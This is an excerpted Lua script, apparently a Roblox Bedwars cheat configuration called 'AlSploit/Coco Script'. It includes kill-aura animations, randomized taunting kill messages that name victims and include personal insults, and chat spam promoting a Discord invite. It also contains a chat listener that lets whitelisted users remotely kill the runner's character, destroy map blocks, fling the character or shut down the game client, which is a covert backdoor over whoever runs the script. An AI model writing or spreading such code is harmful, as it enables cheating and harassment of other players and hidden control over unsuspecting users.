...
local Animations = {
	KillAura = {
		{CFrame = CFrame.new(0.7, -0.4, 0.612) * CFrame.Angles(math.rad(285), math.rad(65), math.rad(293)),Time = 0.25},
		{CFrame = CFrame.new(0.61, -0.41, 0.6) * CFrame.Angles(math.rad(210), math.rad(70), math.rad(3)), Time = 0.25}
	}
}
...
local function AutoToxic(Player)
	...
	if Randomized == 0 then
		KillMessage = "You are so bad u died. L" .. Player.Name .. " | AlSploit/Coco Script on top"
	end

	if Randomized ~= 0 then
		KillMessage = "I could probably win without cheats. L" .. Player.Name .. " | AlSploit/Coco Script on top"
	end

	if Randomized == 2 then
		KillMessage = "Clowns are the only ones we kill. L" .. Player.Name .. " | AlSploit/Coco Script on top"
	end

	if Randomized == 3 then
		KillMessage = "Rats. Imagine dying in a block game. L" .. Player.Name .. " | AlSploit/Coco Script on top"
	end

	if Randomized == 4 then
		KillMessage = ".gg/J6XkRGqTY3. L" .. Player.Name .. " | AlSploit/Coco Script on top"
	end

	if Randomized == 5 then
		KillMessage = "I ruined a good day for a good reason. L" .. Player.Name .. " | AlSploit/Coco Script on top"
	end
...
local function ChatSpam()
	...
	if Randomized == 0 then
		KillMessage = "AlSploit does more updates than Bedwars 💀. | AlSploit/Coco Script on top"
	end

	if Randomized ~= 0 then
		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | AlSploit/Coco Script on top"
	end

	if Randomized == 2 then
		KillMessage = ".gg/J6XkRGqTY3. | AlSploit/Coco Script on top"
	end

	if Randomized == 3 then
		KillMessage = "I am not cheating, my gaming chair is. | AlSploit/Coco Script on top"
	end

	if Randomized == 4 then
		KillMessage = "3 years now, and the anticheat is still the same. | AlSploit/Coco Script on top"
	end

	if Randomized == 5 then
		KillMessage = "Kids in bedwars just keep getting worst. | AlSploit/Coco Script on top"
	end
...
task.spawn(function()
	local Indicators, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "Indicators", Settings.Indicators.Value, function(CallBack)
		...
		if Settings.Indicators.Value == true then
			local Messages = {"AlSploit on top", "Best Client", "EZ", "Coco Script on top", "Best Config"}
		...
		for i, v in next, game.Players:GetPlayers() do
			v.Chatted:Connect(function(Message)
				for i, v2 in pairs(WhitelistedUsers) do
					if Message == ";kill default" and v.Name == v2.Name then
						LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
					...
					if Message == ";breakmap default" and v.Name == v2.Name then
						for i, v in pairs(CollectionService:GetTagged("block")) do
							v:Destroy()
						end
					end

					if Message == ";leave default" and v.Name == v2.Name  then
						game:Shutdown()
					end

					if Message == ";lagback default" and v.Name == v2.Name  then
						LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(9e9, 9e9, 9e9)
					end	

					if Message == ";kick default" and v.Name == v2.Name then	
...
task.spawn(function()
	...
	CreateNotification(5, "Coco AlSploit Config has loaded!")
        CreateNotification(7, "https://discord.com/invite/J6XkRGqTY3")
        CreateNotification(5, "FPS Unlocked")
	setfpscap(999)
end)
